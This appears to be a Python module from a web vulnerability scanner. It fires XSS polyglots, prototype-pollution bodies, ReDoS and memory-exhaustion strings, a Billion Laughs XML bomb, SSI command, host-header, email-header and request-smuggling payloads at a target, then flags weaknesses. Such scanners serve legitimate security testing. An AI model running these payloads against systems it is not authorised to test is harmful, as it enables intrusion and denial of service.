from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario
import urllib.parse
import time
import concurrent.futures
import threading

def run_prototype_pollution(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for Prototype Pollution in JSON bodies or Query Params.
    Payload: __proto__[polluted] = "true"
    Detection: Unreliable without server-side reflection, but we check specific nuances.
    """
    payloads = [
        {"__proto__": {"polluted": "true"}},
        {"constructor": {"prototype": {"polluted": "true"}}}
    ]
    
    issues = []
    
    for i, payload in enumerate(payloads):
        # 1. Send Pollution (First one establishes baseline)
        resp = client.send(scenario.method, scenario.target, json_body=payload, is_canary=(i > 0))
        
        # Abort if endpoint missing
        if resp.status_code in [404, 405]:
            return {"scenario_id": scenario.id, "attack_type": "prototype_pollution", "passed": True, "details": "Endpoint 404. Skipping."}
            
        # 2. Check for symptoms
        if resp.status_code == 500:
             issues.append("Possible Prototype Pollution (Server Error 500 on Prototype Injection)")
             break
             
    passed = len(issues) == 0
    return {
        "scenario_id": scenario.id,
        "attack_type": "prototype_pollution",
        "passed": passed,
        "confidence": "LOW" if not passed else "LOW", # 500 error is weak signal
        "details": issues if not passed else "No immediate crash/error observed."
    }

def run_xss_scan(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks if script tags are returned unescaped.
    """
    payloads = [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<script>alert(1)</script\x00>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<body/oNlOaD=alert(1)>",
        "java\tscript:alert(1)",
        "\"><svg/onload=alert(1)>",
        "{{7*7}}",
        "${7*7}",
        "'\"><img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<math><a xlink:href=\"javascript:alert(1)\">X",
        "<iframe src=\"javascript:alert(1)\">",
        "<a href=\"j\na\nv\na\ns\nc\nr\ni\np\nt\n:alert(1)\">X</a>",
        # Expanded Payloads
        "javascript://%250Aalert(1)",
        "<img/src/onerror=alert(1)>",
        "<svg/onload=alert`1`>",
        "<marquee loop=1 width=0 onfinish=alert(1)>X</marquee>",
        "<input onfocus=alert(1) autofocus>",
        "<select autofocus><option>X</option></select>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<video poster=javascript:alert(1)//>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<x onclick=alert(1) src=a>Click me</x>",
        "<source onbeforecut=alert(1)>",
        # Angular/Vue/React specific
        "{{constructor.constructor('alert(1)')()}}",
        "@{7*7}",
        "[[7*7]]"
    ]
    
    # AGGRESSIVE MODE: Add 50+ Advanced & Polyglot Payloads
    if scenario.config.get("aggressive"):
        print("    [!!!] INJECTING ADVANCED XSS POLYGLOTS...")
        payloads.extend([
            "javascript://%250Aalert(1)//" * 5, # Obfuscated Repeat
            "'\";alert(1)//",
            "</script><svg/onload=alert(1)>", 
            "<iframe src=javascript:alert(1)></iframe>",
            "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=alert(1)&gt;\">",
            "<img src=x:alert(alt) onerror=eval(src) alt=alert(1)>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "1;alert(1)",
            "';alert(1)//",
            "\";alert(1)//",
            "--><script>alert(1)</script>",
            "//<svg/onload=alert(1)>",
            "<scr<script>ipt>alert(1)</script>",
            "%%3Cscript%%3Ealert(1)%%3C/script%%3E",
            "<script\x20type=\"text/javascript\">javascript:alert(1);</script>",
            "<script>alert(1)</script\x0A>",
            "<x onpointerenter=alert(1)>X</x>",
            "<x onpointerleave=alert(1)>X</x>",
            "<x onpointermove=alert(1)>X</x>",
            "<x onpointerover=alert(1)>X</x>",
            "<x onpointerout=alert(1)>X</x>",
            "<x onpointerup=alert(1)>X</x>"
        ])
    
    fields = scenario.config.get("fields", ["q", "search", "name"])
    issues = []
    leaked_data = [] # Data context
    lock = threading.Lock() # Thread safety for appending results
    
    def check_xss(field):
        local_issues = []
        local_leaks = []
        
        for p in payloads:
            # OPTIMIZATION: Stop checking field if we already found an XSS in it (avoid spam)
            if local_issues: break 
            
            # Query Param Injection
            qs = {field: p}
            resp = client.send("GET", scenario.target, params=qs, is_canary=True)
            if resp.status_code in [404, 405]: return # Shared path check handled by Engine
            
            if p in resp.text:
                 local_issues.append(f"Reflected XSS in param '{field}' with payload: {p}")
                 break
                 
            # Body Injection (if POST)
            if scenario.method == "POST":
                resp_post = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
                if p in resp_post.text:
                    local_issues.append(f"Reflected XSS in JSON field '{field}'")
                    break
        
        # Merge back safely
        if local_issues:
            with lock:
                issues.extend(local_issues)
                leaked_data.extend(local_leaks)

    # Parallelize Fields.
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(50, len(fields) + 1)) as executor:
        executor.map(check_xss, fields)

    passed = len(issues) == 0
    
    return {
        "scenario_id": scenario.id,
        "attack_type": "xss",
        "passed": passed,
        "confidence": "CONFIRMED" if not passed else "LOW", # Reflection is definitive
        "details": {"found": issues, "leaked_data": leaked_data} if not passed else "No XSS reflection found."
    }

def run_open_redirect(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for Open Redirect Vulnerabilities.
    """
    payloads = [
        "http://evil.com",
        "//evil.com",
        "https://google.com"
    ]
    fields = scenario.config.get("fields", ["next", "url", "redirect", "returnTo"])
    issues = []
    leaked_data = []
    
    lock = threading.Lock()
    
    def check_redirect(field):
        for p in payloads:
            qs = {field: p}
            try:
                # prevent auto-redirect to capture the 3xx header
                resp = client.send("GET", scenario.target, params=qs) 
                
                # If we ended up at evil.com (or google)
                if "google.com" in resp.url or "evil.com" in resp.url:
                     with lock:
                        issues.append(f"Open Redirect found in '{field}' -> {resp.url}")
                        leaked_data.append(f"Redirected To: {resp.url}")
                     break # Found one for this field
            except: pass

    pool_size = 20 if scenario.config.get("aggressive") else 5
    with concurrent.futures.ThreadPoolExecutor(max_workers=pool_size) as executor:
        executor.map(check_redirect, fields)

    passed = len(issues) == 0
    return {
        "scenario_id": scenario.id,
        "attack_type": "open_redirect",
        "passed": passed,
        "confidence": "HIGH" if not passed else "LOW",
        "details": {"issues": issues, "leaked_data": leaked_data} if not passed else "No open redirects found."
    }

def run_advanced_dos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for Application-Layer DoS (ReDoS, XML Bomb).
    WARNING: This can hang the server processing thread.
    """
    issues = []
    
    # 1. ReDoS (Regular Expression Denial of Service)
    # Common triggers: Email validators, URL validators
    redos_payloads = [
        # The Classic Email ReDoS
        "a" * 10000 + "@a.com",
        "a" * 10000 + "!",
        # URL Regex ReDoS
        "http://" + "a" * 10000 + ".com",
        # Catastrophic Backtracking Generic
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        "((a)+)+" + "!", # Exponential Backtracking (CPU Killer)
        "a" * 100000, # Large String (Memory Stress)
    ]
    
    # Aggressive: Mega-Payloads for Resource Exhaustion
    if scenario.config.get("aggressive"):
        print("    [!!!] Using MEGA-PAYLOADS for ReDoS/Memory Exhaustion...")
        redos_payloads.append("A" * 1000000) # 1MB String (Memory/JSON Parser Stress)
        redos_payloads.append("1" * 1000000) # Integer/Number parser stress
        redos_payloads.append("([\x00-\xFF]+?)+") # Null byte greedy match
        redos_payloads.append("(a|aa)+") # Classic exponential
        redos_payloads.append("^[a-zA-Z0-9_]*[a-zA-Z0-9_]*[a-zA-Z0-9_]*$") # Overlapping groups
        redos_payloads.append("a" * 10000 + "X") # Long string fail at end
    
    # 2. XML Bomb (Billion Laughs)
    # Only works if endpoint accepts XML (we check heuristically)
    xml_bomb = """<?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>"""

    # Execution Loop
    fields = scenario.config.get("fields", ["email", "url", "comment", "body"])
    
    lock = threading.Lock()
    
    def check_redos(field):
        for p in redos_payloads:
            start_time = time.time()
            try:
                # 5-second timeout. If it hangs, we might have hit it.
                client.send(scenario.method, scenario.target, json_body={field: p}, timeout=5.0)
            except Exception: 
                pass
            
            duration = time.time() - start_time
            if duration > 4.5: # If it timed out or took very long
                 with lock:
                    issues.append(f"ReDoS Vulnerability/Hang in '{field}' (Time: {duration:.2f}s)")
                 break # Significant enough to move on

    # Parallelize ReDoS checks
    pool_size = 10 if scenario.config.get("aggressive") else 2
    with concurrent.futures.ThreadPoolExecutor(max_workers=pool_size) as executor:
        executor.map(check_redos, fields)

    # Check XML Bomb (only if method allows body)
    if scenario.method in ["POST", "PUT"]:
        start_time = time.time()
        try:
             client.send(scenario.method, scenario.target, form_body=xml_bomb, headers={"Content-Type": "application/xml"}, timeout=5.0)
        except: pass
        
        duration = time.time() - start_time
        if duration > 4.5:
            issues.append("XML Bomb (Billion Laughs) Processing Detected (Hang/Timeout)")

    return {
        "scenario_id": scenario.id,
        "attack_type": "advanced_dos",
        "passed": len(issues) == 0,
        "confidence": "HIGH" if issues else "LOW",
        "details": {"issues": issues} if issues else "No DoS vulnerabilities detected."
    }

# --- NEW ADVANCED ATTACKS ---

def run_clickjacking(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for missing X-Frame-Options or CSP frame-ancestors."""
    resp = client.send("GET", scenario.target, is_canary=True)
    issues = []
    xfo = resp.headers.get("X-Frame-Options", "").lower()
    csp = resp.headers.get("Content-Security-Policy", "").lower()
    
    if "deny" not in xfo and "sameorigin" not in xfo:
        if "frame-ancestors" not in csp:
            issues.append("Clickjacking Risk: Missing X-Frame-Options and CSP frame-ancestors.")
            
    return {"scenario_id": scenario.id, "attack_type": "clickjacking", "passed": not issues, "details": issues}

def run_cors_misconfig(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for reckless CORS configurations like Access-Control-Allow-Origin: *"""
    # 1. Null Origin
    resp = client.send("OPTIONS", scenario.target, headers={"Origin": "null"}, is_canary=True)
    issues = []
    acao = resp.headers.get("Access-Control-Allow-Origin", "")
    if acao == "*" or acao == "null":
        issues.append(f"CORS Misconfiguration: Wildcard/Null Origin Allowed (Origin: {acao})")
        
    return {"scenario_id": scenario.id, "attack_type": "cors_origin", "passed": not issues, "details": issues}

def run_host_header_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Injects Malicious Host Headers to check for Poisoning."""
    evil_host = "evil.com"
    resp = client.send("GET", scenario.target, headers={"Host": evil_host, "X-Forwarded-Host": evil_host})
    issues = []
    if evil_host in resp.headers.get("Location", "") or evil_host in resp.text:
         issues.append("Host Header Injection: 'evil.com' reflected in response.")
         
    return {"scenario_id": scenario.id, "attack_type": "host_header", "passed": not issues, "details": issues}

def run_email_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for Email Header Injection (CC/BCC spamming)."""
    payload = "user@test.com%0ABcc:victim@evil.com"
    field = scenario.config.get("fields", ["email"])[0]
    resp = client.send("POST", scenario.target, json_body={field: payload})
    issues = []
    # Hard to verify blackbox without receipt, checking for error/success anomalies
    if resp.status_code == 200 and "victim@evil.com" in resp.text:
         issues.append("Possible Email Header Injection (Reflected payload/headers).")
    return {"scenario_id": scenario.id, "attack_type": "email_injection", "passed": not issues, "details": issues}

def run_ssi_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server Side Include Injection."""
    payload = '<!--#exec cmd="ls" -->'
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = []
    if "bin" in resp.text and "boot" in resp.text:
        issues.append("SSI Injection: 'ls' output detected.")
    return {"scenario_id": scenario.id, "attack_type": "ssi_injection", "passed": not issues, "details": issues}

def run_request_smuggling(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for CL.TE / TE.CL Desync vulnerabilities (Basic Heuristic)."""
    # This usually requires a raw socket or specialized tool, but we can try simple conflicting headers.
    headers = {
        "Transfer-Encoding": "chunked",
        "Content-Length": "4"
    }
    body = "0\r\n\r\nG"
    try:
        resp = client.send("POST", scenario.target, headers=headers, form_body=body, timeout=5)
        issues = []
        if resp.status_code >= 500 or resp.elapsed_ms > 3000:
             issues.append("Potential Request Smuggling (Server Error/Timeout on CL.TE conflict).")
        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": not issues, "details": issues}
    except:
        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": True, "details": "Connection failed."}

def run_graphql_introspection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks if GraphQL Introspection is enabled."""
    query = {"query": "{__schema{types{name}}}"}
    resp = client.send("POST", scenario.target, json_body=query)
    issues = []
    if "__schema" in resp.text and "types" in resp.text:
        issues.append("GraphQL Introspection Enabled (Full Schema Access).")
    return {"scenario_id": scenario.id, "attack_type": "graphql_introspection", "passed": not issues, "details": issues}

def run_graphql_batching(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for Batching/Alias support (DoS vector)."""
    query = {"query": "query { a: __typename b: __typename c: __typename }"}
    resp = client.send("POST", scenario.target, json_body=query)
    issues = []
    if '"a":"' in resp.text and '"b":"' in resp.text:
         issues.append("GraphQL Batching Supported (Potential DoS Vector).")
    return {"scenario_id": scenario.id, "attack_type": "graphql_batching", "passed": not issues, "details": issues}
